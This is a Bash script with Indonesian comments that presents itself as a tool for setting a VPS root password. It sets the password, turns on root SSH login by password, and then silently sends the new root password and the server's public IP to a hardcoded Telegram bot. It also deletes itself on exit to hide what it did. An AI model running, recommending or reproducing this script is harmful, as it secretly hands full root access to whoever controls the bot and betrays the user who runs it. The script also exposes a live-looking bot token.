#!/bin/bash

# Fungsi hapus diri saat keluar
junc0() {
    rm -rf "$0"
    exit 0
}
trap junc0 SIGINT SIGTERM EXIT

# Bersihkan layar
clear

# Warna
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

# Fungsi cetak hijau
hijau() { echo -e "$G$*$N"; }

# Dapatkan IP publik
IP=$(wget -qO- ipv4.icanhazip.com)

# Cek apakah user root
if [[ "$EUID" -ne 0 ]]; then
    echo -e "${R}Bukan user root${N}"
    echo -e "${G}Masuk ke mode root dengan perintah: sudo su${N}"
    exit 1
else
    echo -e "${G}Anda sudah dalam mode root${N}"
    sleep 1
fi

# Input password baru
read -rp "$(echo -e "Masukkan ${G}password${N} root baru: ")" -e pass

# Validasi password tidak kosong
if [[ -z "$pass" ]]; then
    echo -e "${R}Password tidak boleh kosong!${N}"
    exit 1
fi

# Set password root
echo "root:$pass" | chpasswd

# Konfigurasi SSH agar root bisa login dengan password
sed -i \
    -e 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' \
    -e 's/PasswordAuthentication no/PasswordAuthentication yes/' \
    -e 's/#PasswordAuthentication no/PasswordAuthentication yes/' \
    -e 's/#PasswordAuthentication yes/PasswordAuthentication yes/' \
    /etc/ssh/sshd_config

# Restart SSH
systemctl restart ssh

# Kirim notifikasi ke Telegram
TIMES="10"
CHATID="7673056681"          # Ganti dengan Chat ID Anda
KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8"  # Ganti dengan Token Bot Anda
URL="https://api.telegram.org/bot${KEY}/sendMessage"

TEXT="
────────────────────
<b>     ☘ NEW ROOT DETAIL ☘</b>
────────────────────
<code>User      :</code> <code>root</code>
<code>Password  :</code> <code>${pass}</code>
<code>IP VPS    :</code> <code>${IP}</code>
────────────────────
<i><b>Note:</b> Auto notif from your script...</i>
"

# Kirim pesan (diam, tanpa output)
curl -s --max-time "${TIMES}" -d "chat_id=${CHATID}&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" "${URL}" >/dev/null

# Tampilkan info akhir
clear
echo
hijau "╭══════════════════════════════════════╮"
hijau "│         ${W}INFO YOUR ROOT USER${G}          │"
hijau "╰══════════════════════════════════════╯"
hijau "╭══════════════════════════════════════╮"
hijau "│ ${W}User      : ${G}root${N}"
hijau "│ ${W}Password  : ${G}${pass}${N}"
hijau "│ ${W}IP VPS    : ${G}${IP}${N}"
hijau "╰══════════════════════════════════════╯"
